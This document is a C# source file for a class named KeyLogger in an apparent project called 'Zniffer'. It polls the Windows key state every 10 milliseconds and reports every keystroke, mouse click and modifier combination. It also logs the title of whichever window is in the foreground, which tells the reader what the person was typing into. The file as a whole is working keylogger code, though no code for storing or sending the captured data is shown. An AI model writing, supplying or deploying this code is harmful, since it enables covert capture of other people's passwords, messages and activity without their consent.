using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Windows.Input;
using System.ComponentModel;

namespace Zniffer {
    class KeyLogger {
        //event raised when key is pressed
        public delegate void keyCaptured(string s);
        public event keyCaptured RaiseKeyCapturedEvent;

        private string keyBuffer;
        private System.Timers.Timer timerKeyMine;
        private string handleCurrentWindow;
        private string handlePrevWindow;

        static bool shift = false;
        static bool control = false;
        static bool alt = false;

        static string registryKey = "Zniffer";

       
        public KeyLogger() {
            keyBuffer = string.Empty;

            timerKeyMine = new System.Timers.Timer();
            timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(getPressedKeys);
            timerKeyMine.Interval = 10;
            timerKeyMine.Enabled = true;
        }

        public static string GetForegroundApplication() {
            IntPtr handle = GetForegroundWindow();
            StringBuilder title = new StringBuilder(1024);
            int len = GetWindowText(handle, title, title.Capacity);
            if ((len <= 0) || (len > title.Length))
                return "unknown";
            return title.ToString();
        }

        public void getPressedKeys(object sender, System.Timers.ElapsedEventArgs easd) {
            handleCurrentWindow = GetForegroundApplication();

            if (handleCurrentWindow != handlePrevWindow) {//focuse changed
                RaiseKeyCapturedEvent("[" + handleCurrentWindow + "]");
                handlePrevWindow = handleCurrentWindow;
            }

            foreach (System.Int32 i in Enum.GetValues(typeof(Keys))) {
                if (GetAsyncKeyState(i) == -32767) {
                    bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                    bool NumLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;

                    if (ControlKeyActive) {
                        control = true;
                    }
                    if (AltKeyActive) {
                        alt = true;
                    }

                    if ((CapsLock || ShiftKeyActive) && !(CapsLock && ShiftKeyActive))
                        shift = true;


                    if (Enum.GetName(typeof(Keys), i) == "LButton")
                        RaiseKeyCapturedEvent("<LMouse>");
                    else if (Enum.GetName(typeof(Keys), i) == "RButton")
                        RaiseKeyCapturedEvent("<RMouse>");
                    else if (Enum.GetName(typeof(Keys), i) == "Back")
                        RaiseKeyCapturedEvent("<Backspace>");
                    else if (Enum.GetName(typeof(Keys), i) == "Space")
                        RaiseKeyCapturedEvent(" ");
                    else if (Enum.GetName(typeof(Keys), i) == "Return")
                        RaiseKeyCapturedEvent("<Enter>");
                    else if (Enum.GetName(typeof(Keys), i) == "ControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LControlKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "ShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "LShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "RShiftKey")
                        continue;
                    else if (Enum.GetName(typeof(Keys), i) == "Delete")
                        RaiseKeyCapturedEvent("<Del>");
                    else if (Enum.GetName(typeof(Keys), i) == "Insert")
                        RaiseKeyCapturedEvent("<Ins>");
                    else if (Enum.GetName(typeof(Keys), i) == "Home")
                        RaiseKeyCapturedEvent("<Home>");
                    else if (Enum.GetName(typeof(Keys), i) == "End")
                        RaiseKeyCapturedEvent("<End>");
                    else if (Enum.GetName(typeof(Keys), i) == "Tab")
                        RaiseKeyCapturedEvent("<Tab>");
                    else if (Enum.GetName(typeof(Keys), i) == "Prior")
                        RaiseKeyCapturedEvent("<Page Up>");
                    else if (Enum.GetName(typeof(Keys), i) == "PageDown")
                        RaiseKeyCapturedEvent("<Page Down>");
                    else if (Enum.GetName(typeof(Keys), i) == "LWin")
                        RaiseKeyCapturedEvent("<LWin>");
                    else if (Enum.GetName(typeof(Keys), i) == "RWin")
                        RaiseKeyCapturedEvent("<RWin>");
                    else if (Enum.GetName(typeof(Keys), i) == "CapsLock")
                        RaiseKeyCapturedEvent("<CapsLock>");
                    else if (Enum.GetName(typeof(Keys), i) == "Apps")
                        RaiseKeyCapturedEvent("<Apps>");
                    else if (Enum.GetName(typeof(Keys), i) == "PrintScreen")
                        RaiseKeyCapturedEvent("<PrintScreen>");
                    else if (Enum.GetName(typeof(Keys), i) == "NumLock")
                        RaiseKeyCapturedEvent("<NumLock>");
                    else if (Enum.GetName(typeof(Keys), i) == "Scroll")
                        RaiseKeyCapturedEvent("<Scroll>");
                    else if (Enum.GetName(typeof(Keys), i) == "Escape")
                        RaiseKeyCapturedEvent("<Escape>");
                    else if (Enum.GetName(typeof(Keys), i) == "LMenu")
                        RaiseKeyCapturedEvent("<LeftAlt>");
                    else if (Enum.GetName(typeof(Keys), i) == "Menu")
                        RaiseKeyCapturedEvent("<Alt>");
                    else if (Enum.GetName(typeof(Keys), i) == "RMenu")
                        RaiseKeyCapturedEvent("<RightAlt>");
                    else {
                        KeysConverter kc = new KeysConverter();
                        string keyChar = kc.ConvertToString(i);


                        //RaiseKeyCapturedEvent(keyChar);


                        if (!shift) {
                            keyChar = keyChar.ToLower();

                        } else {
                            keyChar = keyChar.ToUpper();
                            //oemminus//oemplus//oemminus//oemplus//divide//multiply//subtract//add

                            if (i >= 48 && i <= 57) {//numbers

                            }


                            //RaiseKeyCapturedEvent("" + i);
                        }
                        RaiseKeyCapturedEvent("{" + Convert.ToInt32(control) + Convert.ToInt32(alt) + "}" + keyChar);
                    }

                    control = shift = alt = false;
                }

            }
        }

        #region ToggleKeys
        public static bool ControlKeyActive {// ControlKey
            get { return Convert.ToBoolean(GetAsyncKeyState((int)Keys.ControlKey) & 0x8000); }
        }
        public static bool ShiftKeyActive {// ShiftKey
            get { return Convert.ToBoolean(GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000); }
        }
        public static bool AltKeyActive {// AltKey
            get { return Convert.ToBoolean(GetAsyncKeyState((int)Keys.Menu) & 0x8000); }
        }
        #endregion

        #region DllImports
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        #endregion
    }
}
